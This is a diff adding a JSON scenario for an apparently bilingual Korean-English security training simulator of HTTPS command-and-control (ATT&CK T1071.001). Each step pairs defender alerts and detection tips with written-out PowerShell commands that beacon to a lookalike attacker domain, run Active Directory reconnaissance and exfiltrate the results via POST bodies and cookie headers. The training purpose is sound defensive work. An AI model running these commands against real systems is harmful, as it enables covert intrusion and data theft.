@@ -1,0 +1,260 @@
+{
+  "id": "T1071.001",
+  "title": "웹 프로토콜 C2 시뮬레이션",
+  "titleEn": "Web Protocols C2 Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon" },
+    { "label": "공격", "labelEn": "Attack" },
+    { "label": "침투", "labelEn": "Breach" },
+    { "label": "완료", "labelEn": "Complete" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "type": "attacker" },
+    { "id": "target", "label": "Target PC", "type": "victim" },
+    { "id": "c2", "label": "C2 Server (HTTPS)", "type": "server" },
+    { "id": "ndr", "label": "NDR / Proxy", "type": "defense" }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "c2", "label": "C2 Infra", "activeStep": 0 },
+    { "from": "target", "to": "c2", "label": "HTTPS Beacon", "activeStep": 1 },
+    { "from": "c2", "to": "target", "label": "Task Delivery", "activeStep": 3 },
+    { "from": "ndr", "to": "c2", "label": "Traffic Monitor", "activeStep": 2 }
+  ],
+  "desktopIcons": [
+    { "label": "PowerShell", "icon": "💻" },
+    { "label": "Beacon Agent", "icon": "📡" },
+    { "label": "AD Recon", "icon": "🔍" }
+  ],
+  "steps": [
+    {
+      "cmd": "powershell -ep bypass -c \"\n$beacon = @{\n  id = [guid]::NewGuid().ToString().Substring(0,8);\n  hostname = $env:COMPUTERNAME;\n  user = '{userName}';\n  domain = '{companyName}';\n  os = (Get-CimInstance Win32_OperatingSystem).Caption;\n  arch = $env:PROCESSOR_ARCHITECTURE;\n  pid = $PID\n} | ConvertTo-Json;\nWrite-Host $beacon\"",
+      "out": "{\n  \"id\": \"a3f8c2d1\",\n  \"hostname\": \"WS-PC0142\",\n  \"user\": \"{userName}\",\n  \"domain\": \"{companyName}\",\n  \"os\": \"Microsoft Windows 11 Pro\",\n  \"arch\": \"AMD64\",\n  \"pid\": 6840\n}",
+      "def": "[EDR] System reconnaissance data assembled into JSON beacon structure",
+      "defAction": "Process: powershell.exe (PID: 6840)\nAction: System info collection → JSON serialization\nData: hostname, user, domain, OS, architecture\nPattern: C2 beacon preparation\nRisk: MEDIUM",
+      "desc": "공격자가 시스템 정보를 JSON 형식의 비콘 데이터로 조합합니다. C2 서버에 최초 등록할 때 사용됩니다.",
+      "descEn": "The attacker assembles system information into a JSON beacon structure used for initial registration with the C2 server.",
+      "stepTitle": "비콘 데이터 조립",
+      "stepTitleEn": "Assemble Beacon",
+      "feynman": "스파이가 본부에 처음 보고할 때 자기 위치, 신분, 장비를 정리해서 보내는 것과 같습니다. 이 정보로 본부가 스파이를 식별하고 관리합니다.",
+      "feynmanEn": "It's like a spy compiling their location, identity, and equipment info for their first report to HQ. This lets HQ identify and manage the agent.",
+      "expert": "C2 비콘 초기화 단계에서 시스템 정보를 JSON으로 구조화합니다. Cobalt Strike, Sliver 등 주요 C2 프레임워크 모두 유사한 등록 데이터를 수집합니다. Sysmon Event ID 1에서 WMI 쿼리를 탐지할 수 있습니다.",
+      "expertEn": "The C2 beacon initialization stage structures system info as JSON. Major C2 frameworks like Cobalt Strike and Sliver all collect similar registration data. WMI queries can be detected via Sysmon Event ID 1.",
+      "defTooltip": "PowerShell에서 Get-CimInstance Win32_OperatingSystem, COMPUTERNAME, PROCESSOR_ARCHITECTURE 등을 동시에 수집하는 패턴은 C2 비콘 초기화입니다.",
+      "defTooltipEn": "PowerShell collecting Get-CimInstance Win32_OperatingSystem, COMPUTERNAME, PROCESSOR_ARCHITECTURE simultaneously indicates C2 beacon initialization.",
+      "hackerLog": {
+        "title": "비콘 데이터 조립",
+        "lines": [
+          { "text": "\"id\": \"a3f8c2d1\"", "desc": "고유 비콘 ID 생성 - C2 세션 식별자" },
+          { "text": "\"os\": \"Microsoft Windows 11 Pro\"", "desc": "타겟 시스템 정보 수집 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "Beacon", "desc": "감염된 호스트가 C2 서버로 주기적으로 보내는 신호/데이터 패킷" },
+        { "term": "C2 (Command & Control)", "desc": "공격자가 원격으로 악성코드를 제어하는 서버 인프라" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$headers = @{\n  'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';\n  'Accept' = 'text/html,application/json';\n  'X-Request-ID' = 'a3f8c2d1';\n};\n$body = @{ data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($beacon)) };\nInvoke-WebRequest -Uri 'https://cdn-assets.{companyName}-update.com/api/v2/check' -Method POST -Headers $headers -Body ($body | ConvertTo-Json) -ContentType 'application/json'\"",
+      "out": "StatusCode        : 200\nStatusDescription : OK\nContent           : {\"status\":\"registered\",\"interval\":30,\"jitter\":0.2,\"taskId\":\"none\"}\nHeaders           : {[Content-Type, application/json], [Server, nginx/1.24.0],\n                    [X-Request-ID, a3f8c2d1], [Date, Sat, 01 Mar 2026 10:00:15 GMT]}",
+      "def": "[NDR] Suspicious HTTPS POST to recently registered domain",
+      "defAction": "Source: 10.10.15.22 (WS-PC0142)\nDestination: 185.234.xx.xx (cdn-assets.{companyName}-update.com)\nMethod: POST\nPath: /api/v2/check\nDomain Age: 7 days\nTLS: Valid cert (Let's Encrypt)\nRisk: HIGH",
+      "desc": "합법적인 소프트웨어 업데이트 URL로 위장한 C2 서버에 HTTPS POST로 비콘을 전송합니다.",
+      "descEn": "Sends a beacon via HTTPS POST to a C2 server disguised as a legitimate software update URL.",
+      "stepTitle": "C2 서버 등록",
+      "stepTitleEn": "Register with C2",
+      "feynman": "스파이가 일반 택배처럼 보이는 봉투에 보고서를 넣어서 보내는 것과 같습니다. 겉보기에는 평범한 택배인데, 실제로는 비밀 본부로 보내는 첫 보고입니다.",
+      "feynmanEn": "It's like a spy sending a report in an envelope disguised as a regular delivery package. It looks like normal mail but is actually the first report to a secret headquarters.",
+      "expert": "cdn-assets.{companyName}-update.com처럼 합법적 도메인을 모방합니다. Domain age 7일은 의심 지표이며, Let's Encrypt 인증서는 무료로 누구나 발급 가능합니다. NDR에서 신규 도메인 접속 + Base64 POST 패턴을 탐지해야 합니다.",
+      "expertEn": "Mimics legitimate domains like cdn-assets.{companyName}-update.com. Domain age of 7 days is suspicious. Let's Encrypt certs are free for anyone. NDR should detect new domain access + Base64 POST patterns.",
+      "defTooltip": "NDR에서 도메인 등록일이 30일 미만인 HTTPS 목적지와 Base64 페이로드를 포함한 POST 요청을 상관분석하세요.",
+      "defTooltipEn": "Correlate HTTPS POST requests with Base64 payloads to domains registered within the last 30 days in your NDR.",
+      "hackerLog": {
+        "title": "C2 서버 최초 등록",
+        "lines": [
+          { "text": "POST https://cdn-assets.{companyName}-update.com/api/v2/check", "desc": "합법적 업데이트 URL로 위장한 C2 통신" },
+          { "text": "\"status\":\"registered\",\"interval\":30", "desc": "C2 등록 성공, 30초 간격 비콘 설정" }
+        ]
+      },
+      "terms": [
+        { "term": "Domain Fronting", "desc": "합법적 도메인 뒤에 C2 트래픽을 숨기는 기법" },
+        { "term": "Jitter", "desc": "비콘 간격에 랜덤성을 추가하여 정규 패턴 탐지를 회피하는 기법" },
+        { "term": "User-Agent Spoofing", "desc": "브라우저 식별자를 위조하여 정상 트래픽으로 위장" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\nwhile($true) {\n  Start-Sleep -Seconds (30 + (Get-Random -Minimum -6 -Maximum 6));\n  $resp = Invoke-RestMethod -Uri 'https://cdn-assets.{companyName}-update.com/api/v2/check' -Method GET -Headers @{'X-Request-ID'='a3f8c2d1'; 'Cookie'='session=dGFza19wZW5kaW5n'};\n  Write-Host \\\"[$(Get-Date -Format 'HH:mm:ss')] Beacon: interval=30s jitter=20% task=$($resp.taskId)\\\";\n  if($resp.taskId -ne 'none') { break }\n}\"",
+      "out": "[10:00:45] Beacon: interval=30s jitter=20% task=none\n[10:01:18] Beacon: interval=30s jitter=20% task=none\n[10:01:50] Beacon: interval=30s jitter=20% task=none\n[10:02:21] Beacon: interval=30s jitter=20% task=cmd_exec_7f3a",
+      "def": "[NDR] Periodic HTTPS beaconing detected - consistent interval with jitter",
+      "defAction": "Source: 10.10.15.22\nDestination: cdn-assets.{companyName}-update.com\nPattern: ~30s intervals ±6s (jitter: 20%)\nBeacons Observed: 4\nProtocol: HTTPS GET\nRisk: HIGH\nAction: Domain added to watchlist",
+      "desc": "30초 간격(±20% 지터)으로 C2 서버에 비콘을 전송하여 새 작업을 확인합니다. 4번째 비콘에서 명령을 수신합니다.",
+      "descEn": "Sends beacons to C2 server at 30-second intervals (±20% jitter) checking for new tasks. Receives a command on the 4th beacon.",
+      "stepTitle": "비콘 폴링 루프",
+      "stepTitleEn": "Beacon Polling Loop",
+      "feynman": "스파이가 매일 정해진 시간에 비밀 사서함을 확인하러 가는 것과 같습니다. 3번은 비어있었지만, 4번째에 새로운 임무 지시서가 들어있습니다.",
+      "feynmanEn": "It's like a spy checking a secret mailbox at regular intervals every day. It was empty 3 times, but on the 4th check, there's a new mission briefing.",
+      "expert": "30초 ± 20% 지터 패턴은 Cobalt Strike의 기본 비콘 프로파일과 유사합니다. NDR에서 일정 간격의 HTTP(S) 요청 패턴을 통계적으로 분석하면 C2 비콘을 탐지할 수 있습니다. JA3/JA3S TLS 핑거프린트 매칭도 유효합니다.",
+      "expertEn": "The 30s ± 20% jitter pattern resembles Cobalt Strike's default beacon profile. Statistical analysis of periodic HTTP(S) request patterns in NDR can detect C2 beacons. JA3/JA3S TLS fingerprint matching is also effective.",
+      "defTooltip": "NDR에서 동일 목적지에 대한 주기적 HTTPS GET 요청을 통계 분석하세요. 표준편차가 작은 반복 패턴은 C2 비콘의 강력한 지표입니다.",
+      "defTooltipEn": "Use NDR statistical analysis on periodic HTTPS GET requests to the same destination. Repeating patterns with small standard deviation strongly indicate C2 beaconing.",
+      "hackerLog": {
+        "title": "비콘 폴링 활동",
+        "lines": [
+          { "text": "[10:00:45] Beacon: interval=30s jitter=20% task=none", "desc": "첫 번째 비콘 - 대기 중" },
+          { "text": "[10:02:21] Beacon: ... task=cmd_exec_7f3a", "desc": "4번째 비콘에서 실행 명령 수신" }
+        ]
+      },
+      "terms": [
+        { "term": "Beaconing", "desc": "감염된 호스트가 C2 서버에 주기적으로 체크인하는 통신 패턴" },
+        { "term": "JA3 Fingerprint", "desc": "TLS 클라이언트 핸드셰이크를 해시화한 네트워크 핑거프린트" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$task = Invoke-RestMethod -Uri 'https://cdn-assets.{companyName}-update.com/api/v2/tasks/cmd_exec_7f3a' -Headers @{'X-Request-ID'='a3f8c2d1'};\n$decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.payload));\nWrite-Host \\\"Task Type: $($task.type)\\\";\nWrite-Host \\\"Command: $decoded\\\"\"",
+      "out": "Task Type: cmd_exec\nCommand: net user /domain & nltest /dclist:{companyName} & net group \"Domain Admins\" /domain",
+      "def": "[SIEM] C2 task retrieval - Base64 encoded command payload",
+      "defAction": "Source: 10.10.15.22\nC2 Server: cdn-assets.{companyName}-update.com\nTask ID: cmd_exec_7f3a\nPayload: Base64 encoded AD reconnaissance commands\nRisk: CRITICAL",
+      "desc": "C2 서버에서 Base64 인코딩된 명령을 수신합니다. Active Directory 정찰 명령이 포함되어 있습니다.",
+      "descEn": "Receives Base64-encoded commands from the C2 server containing Active Directory reconnaissance commands.",
+      "stepTitle": "명령 수신/디코딩",
+      "stepTitleEn": "Receive Task",
+      "feynman": "비밀 사서함에서 암호로 된 편지를 꺼내 해독하는 것과 같습니다. 해독하면 '건물 내 모든 직원 명단과 관리자 목록을 확인하라'는 지시입니다.",
+      "feynmanEn": "It's like retrieving a coded letter from a secret mailbox and decoding it. The decoded message says 'Get the list of all employees and administrators in the building.'",
+      "expert": "Base64 인코딩은 암호화가 아니라 인코딩입니다. TLS 복호화(MITM 프록시) 환경에서는 페이로드를 검사할 수 있습니다. net user /domain, nltest, net group은 전형적인 AD 정찰 명령 조합입니다.",
+      "expertEn": "Base64 is encoding, not encryption. In TLS decryption (MITM proxy) environments, payloads can be inspected. net user /domain, nltest, net group is a classic AD reconnaissance command set.",
+      "defTooltip": "Sysmon Event ID 3 (Network Connection)에서 C2 도메인 접속 후 즉시 net.exe, nltest.exe가 실행되는 상관관계를 탐지하세요.",
+      "defTooltipEn": "Detect correlation in Sysmon Event ID 3 (Network Connection) where net.exe, nltest.exe execute immediately after C2 domain connection.",
+      "hackerLog": {
+        "title": "C2 명령 수신",
+        "lines": [
+          { "text": "Task Type: cmd_exec", "desc": "원격 명령 실행 유형 태스크" },
+          { "text": "Command: net user /domain & nltest /dclist", "desc": "AD 정찰 명령 조합 수신" }
+        ]
+      },
+      "terms": [
+        { "term": "Base64 Encoding", "desc": "바이너리 데이터를 ASCII 텍스트로 변환하는 인코딩 방식 (암호화 아님)" },
+        { "term": "AD Reconnaissance", "desc": "Active Directory 환경의 사용자, 그룹, DC 정보를 수집하는 정찰 활동" }
+      ]
+    },
+    {
+      "cmd": "net user /domain & nltest /dclist:{companyName} & net group \"Domain Admins\" /domain",
+      "out": "The request will be processed at a domain controller for domain {companyName}.local.\n\nUser accounts for \\\\DC01.{companyName}.local\n----------------------------------------------------\nAdministrator    {userName}         svc_backup\nsvc_sql          krbtgt             helpdesk\njpark            klee               ykim\nThe command completed successfully.\n\nGet list of DCs in domain '{companyName}' from '\\\\DC01'.\n    DC01.{companyName}.local [PDC]  [DS] Site: Default-First-Site-Name\n    DC02.{companyName}.local        [DS] Site: DR-Site\nThe command completed successfully.\n\nGroup name     Domain Admins\nMembers\n------------------------------------\nAdministrator\n{userName}\nThe command completed successfully.",
+      "def": "[SIEM] Active Directory reconnaissance via C2 tasking",
+      "defAction": "Host: WS-PC0142\nUser: {userName}\nCommands: net user /domain, nltest /dclist, net group\nData Exposed: User list, DC list, Domain Admins\nRisk: HIGH",
+      "desc": "C2에서 수신한 명령을 실행하여 도메인 사용자, DC 목록, Domain Admins 그룹 구성원을 수집합니다.",
+      "descEn": "Executes C2-received commands to enumerate domain users, domain controllers, and Domain Admins group members.",
+      "stepTitle": "AD 정찰 실행",
+      "stepTitleEn": "Execute AD Recon",
+      "feynman": "본부에서 받은 지시대로 건물 내 모든 직원 명부, 관리자 사무실 위치, VIP 목록을 조사하는 것과 같습니다. 이 정보로 다음 공격 대상을 정합니다.",
+      "feynmanEn": "It's like following HQ orders to investigate the building's employee directory, manager offices, and VIP list. This info determines the next attack target.",
+      "expert": "net user /domain, nltest /dclist, net group \"Domain Admins\" 조합은 MITRE ATT&CK T1087.002 (Account Discovery: Domain Account)와 T1018 (Remote System Discovery)에 해당합니다. Windows Security Event ID 4661 (객체 핸들 요청)로 탐지 가능합니다.",
+      "expertEn": "The combination of net user /domain, nltest /dclist, net group 'Domain Admins' maps to MITRE ATT&CK T1087.002 and T1018. Detectable via Windows Security Event ID 4661 (object handle request).",
+      "defTooltip": "net.exe와 nltest.exe의 연속 실행을 Sysmon Event ID 1에서 탐지하세요. 비관리자 호스트에서 이 명령 조합이 실행되면 즉시 조사가 필요합니다.",
+      "defTooltipEn": "Detect sequential execution of net.exe and nltest.exe in Sysmon Event ID 1. If this combination runs from a non-admin host, immediate investigation is needed.",
+      "hackerLog": {
+        "title": "AD 정찰 결과",
+        "lines": [
+          { "text": "User accounts: Administrator, {userName}, svc_backup, svc_sql...", "desc": "도메인 전체 사용자 목록 수집" },
+          { "text": "Domain Admins: Administrator, {userName}", "desc": "도메인 관리자 계정 식별 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "Domain Controller (DC)", "desc": "Active Directory 인증과 정책을 관리하는 핵심 서버" },
+        { "term": "Domain Admins", "desc": "도메인 전체에 대한 최고 관리 권한을 가진 보안 그룹" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$output = net user /domain 2>&1 | Out-String;\n$output += nltest /dclist:{companyName} 2>&1 | Out-String;\n$output += net group 'Domain Admins' /domain 2>&1 | Out-String;\n$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output));\n$result = @{ taskId='cmd_exec_7f3a'; status='complete'; data=$encoded } | ConvertTo-Json;\nInvoke-RestMethod -Uri 'https://cdn-assets.{companyName}-update.com/api/v2/results' -Method POST -Body $result -ContentType 'application/json' -Headers @{'X-Request-ID'='a3f8c2d1'};\nWrite-Host \\\"Result posted: $($encoded.Length) bytes (Base64)\\\"\"",
+      "out": "Result posted: 1847 bytes (Base64)",
+      "def": "[NDR] Encoded data exfiltration over HTTPS to C2 server",
+      "defAction": "Source: 10.10.15.22\nDestination: cdn-assets.{companyName}-update.com\nMethod: POST /api/v2/results\nPayload: 1847 bytes Base64 (AD recon data)\nRisk: CRITICAL\nAction: Connection blocked",
+      "desc": "수집된 AD 정보를 Base64로 인코딩하여 C2 서버에 HTTPS POST로 전송합니다.",
+      "descEn": "Encodes collected AD information in Base64 and sends it to the C2 server via HTTPS POST.",
+      "stepTitle": "정찰 결과 전송",
+      "stepTitleEn": "Exfil Recon Data",
+      "feynman": "스파이가 수집한 직원 명부를 비밀 잉크로 적어서 일반 편지처럼 위장해서 본부에 보내는 것과 같습니다. 우체국 직원은 그냥 보통 편지라고 생각합니다.",
+      "feynmanEn": "It's like a spy writing the collected employee list in invisible ink, disguising it as a regular letter, and mailing it to HQ. The postal worker thinks it's just a normal letter.",
+      "expert": "정찰 결과의 HTTPS POST 전송은 T1041 (Exfiltration Over C2 Channel)에 해당합니다. 1847바이트의 Base64 데이터에는 도메인 사용자, DC, 관리자 정보가 포함됩니다. DLP에서 Base64 인코딩된 AD 관련 키워드를 탐지할 수 있습니다.",
+      "expertEn": "HTTPS POST exfiltration of recon results maps to T1041 (Exfiltration Over C2 Channel). The 1847-byte Base64 data contains domain users, DCs, and admin info. DLP can detect Base64-encoded AD-related keywords.",
+      "defTooltip": "NDR에서 HTTPS POST 요청의 페이로드 크기와 빈도를 모니터링하세요. AD 정찰 후 대량 데이터가 외부로 전송되는 패턴을 탐지하세요.",
+      "defTooltipEn": "Monitor HTTPS POST payload sizes and frequency in NDR. Detect patterns of large data transfers to external destinations following AD reconnaissance.",
+      "hackerLog": {
+        "title": "데이터 유출 전송",
+        "lines": [
+          { "text": "POST /api/v2/results", "desc": "C2 서버로 정찰 결과 전송" },
+          { "text": "Result posted: 1847 bytes (Base64)", "desc": "AD 정보 1847바이트 유출 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "Data Exfiltration", "desc": "수집된 데이터를 공격자 서버로 전송하는 행위" },
+        { "term": "T1041", "desc": "MITRE ATT&CK - C2 채널을 통한 데이터 유출 기법" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Simulating malleable C2 profile - data hidden in cookie headers\n$data = 'eyJ1c2VycyI6WyJhZG1pbiIsInN2Y19iYWNrdXAiXSwiZGNzIjpbIkRDMDEiLCJEQzAyIl19';\n$headers = @{\n  'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';\n  'Cookie' = \\\"__cfduid=$data; _ga=GA1.2.123456789; _gid=GA1.2.987654321\\\";\n  'Accept' = 'image/webp,image/png,image/*;q=0.8';\n  'Referer' = 'https://www.{companyName}.com/products';\n};\nInvoke-WebRequest -Uri 'https://cdn-assets.{companyName}-update.com/static/logo.png' -Headers $headers;\nWrite-Host 'C2 data exfiltrated via cookie header in image request'\"",
+      "out": "C2 data exfiltrated via cookie header in image request",
+      "def": "[NDR] Suspicious cookie values in HTTPS request - data exfiltration channel",
+      "defAction": "Source: 10.10.15.22\nDestination: cdn-assets.{companyName}-update.com\nRequest: GET /static/logo.png\nSuspicious Cookie: __cfduid contains Base64 data (88 bytes)\nReferer: Spoofed ({companyName}.com)\nRisk: HIGH\nAction: TLS inspection recommended",
+      "desc": "쿠키 헤더에 Base64 데이터를 숨겨 이미지 요청으로 위장합니다. 일반 웹 트래픽과 구분하기 어렵습니다.",
+      "descEn": "Hides Base64 data in cookie headers disguised as an image request. Difficult to distinguish from normal web traffic.",
+      "stepTitle": "쿠키 헤더 유출",
+      "stepTitleEn": "Cookie Header Exfil",
+      "feynman": "사진을 요청하는 것처럼 보이지만, 실제로는 편지 봉투 뒷면에 비밀 메시지를 적어서 보내는 것과 같습니다. 우체국은 사진 요청만 보고, 뒷면 메시지는 모릅니다.",
+      "feynmanEn": "It looks like requesting a photo, but a secret message is written on the back of the envelope. The post office only sees the photo request, not the hidden message.",
+      "expert": "Malleable C2 프로파일은 Cobalt Strike에서 사용하는 트래픽 위장 기법입니다. 쿠키 헤더에 데이터를 숨기고, 이미지 요청으로 위장하며, 합법적 Referer를 위조합니다. TLS 검사(SSL Inspection) 없이는 탐지가 매우 어렵습니다.",
+      "expertEn": "Malleable C2 profiles are traffic disguise techniques used by Cobalt Strike. Data is hidden in cookie headers, disguised as image requests, with spoofed Referers. Detection is very difficult without TLS inspection (SSL Inspection).",
+      "defTooltip": "TLS 검사(SSL Inspection)를 도입하여 HTTPS 내부의 쿠키 값과 페이로드를 검사하세요. 비정상적으로 긴 쿠키 값이나 Base64 패턴을 탐지하세요.",
+      "defTooltipEn": "Deploy TLS inspection (SSL Inspection) to examine cookie values and payloads inside HTTPS. Detect abnormally long cookie values or Base64 patterns.",
+      "hackerLog": {
+        "title": "쿠키 헤더 통한 데이터 유출",
+        "lines": [
+          { "text": "Cookie: __cfduid=eyJ1c2VycyI6...", "desc": "쿠키에 Base64 인코딩된 AD 정보 삽입" },
+          { "text": "GET /static/logo.png", "desc": "이미지 요청으로 위장한 C2 통신" }
+        ]
+      },
+      "terms": [
+        { "term": "Malleable C2 Profile", "desc": "C2 트래픽을 합법적 웹 트래픽처럼 보이게 커스터마이징하는 설정" },
+        { "term": "SSL Inspection", "desc": "HTTPS 트래픽을 복호화하여 내부 콘텐츠를 검사하는 보안 기술" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# C2 sleep command - increase beacon interval to evade detection\n$resp = Invoke-RestMethod -Uri 'https://cdn-assets.{companyName}-update.com/api/v2/check' -Headers @{'X-Request-ID'='a3f8c2d1'};\nWrite-Host \\\"New C2 config received:\";\nWrite-Host \\\"  Interval: $($resp.interval)s → 300s (5 min)\\\";\nWrite-Host \\\"  Jitter: $($resp.jitter) → 0.4 (40%)\\\";\nWrite-Host \\\"  Kill date: $($resp.killdate)\\\";\nWrite-Host \\\"  Next beacon: $(Get-Date (Get-Date).AddSeconds(300) -Format 'HH:mm:ss')\\\"\"",
+      "out": "New C2 config received:\n  Interval: 30s → 300s (5 min)\n  Jitter: 0.2 → 0.4 (40%)\n  Kill date: 2026-03-15T00:00:00Z\n  Next beacon: 10:07:21",
+      "def": "[SIEM] C2 beacon interval changed - evasion behavior detected",
+      "defAction": "Host: WS-PC0142\nC2: cdn-assets.{companyName}-update.com\nOld Interval: 30s (jitter: 20%)\nNew Interval: 300s (jitter: 40%)\nKill Date: 2026-03-15\nRisk: HIGH\nAction: Host isolation recommended",
+      "desc": "C2 서버가 비콘 간격을 30초에서 5분으로 늘려 탐지를 회피합니다. 킬 데이트 설정으로 자동 종료됩니다.",
+      "descEn": "C2 server increases beacon interval from 30s to 5min to evade detection. Kill date is set for automatic termination.",
+      "stepTitle": "비콘 간격 변경",
+      "stepTitleEn": "Change Beacon Interval",
+      "feynman": "스파이가 '이제부터 매일이 아니라 5일에 한 번 연락해라, 3월 15일이 되면 활동을 완전히 중단해라'라는 새 지시를 받는 것과 같습니다. 더 은밀하게 활동합니다.",
+      "feynmanEn": "It's like a spy receiving new orders: 'Contact once every 5 days instead of daily, and cease all operations on March 15th.' Now operating more covertly.",
+      "expert": "비콘 간격을 30초에서 300초로 늘리고 지터를 40%로 설정하면 통계적 패턴 탐지가 더 어려워집니다. Kill date는 공격자의 OPSEC(운영 보안)을 위한 자동 종료 메커니즘으로, 증거 인멸에도 사용됩니다.",
+      "expertEn": "Increasing beacon interval from 30s to 300s with 40% jitter makes statistical pattern detection harder. Kill date is an OPSEC auto-termination mechanism also used for evidence destruction.",
+      "defTooltip": "C2 비콘의 간격이 갑자기 변경되는 것을 탐지하세요. NDR에서 동일 목적지로의 접속 패턴이 변경되면 알림을 생성하세요. 킬 데이트 이전에 호스트를 확보하는 것이 중요합니다.",
+      "defTooltipEn": "Detect sudden changes in C2 beacon intervals. Create NDR alerts when access patterns to the same destination change. Securing the host before the kill date is critical.",
+      "hackerLog": {
+        "title": "C2 설정 변경",
+        "lines": [
+          { "text": "Interval: 30s → 300s (5 min)", "desc": "비콘 간격을 5분으로 증가시켜 탐지 회피" },
+          { "text": "Kill date: 2026-03-15T00:00:00Z", "desc": "킬 데이트 설정 - 자동 종료/증거 인멸" }
+        ]
+      },
+      "terms": [
+        { "term": "Kill Date", "desc": "C2 에이전트가 자동으로 활동을 중단하고 자가 삭제하는 예약 날짜" },
+        { "term": "OPSEC (Operations Security)", "desc": "공격자의 작전 보안 - 탐지 회피를 위한 운영 규칙과 절차" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "powershell.exe (PID: 6840)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "Beacon Init (JSON assembly)", "depth": 2, "alert": false, "minStep": 0 },
+    { "name": "Invoke-WebRequest → POST /api/v2/check", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "Beacon Loop (30s ± jitter)", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "Task: cmd_exec_7f3a", "depth": 3, "alert": true, "minStep": 3 },
+    { "name": "net.exe / nltest.exe (AD recon)", "depth": 4, "alert": true, "minStep": 4 },
+    { "name": "POST /api/v2/results (exfil)", "depth": 3, "alert": true, "minStep": 5 },
+    { "name": "GET /static/logo.png (cookie exfil)", "depth": 3, "alert": true, "minStep": 6 },
+    { "name": "Config update: interval=300s", "depth": 2, "alert": false, "minStep": 7 }
+  ]
+}
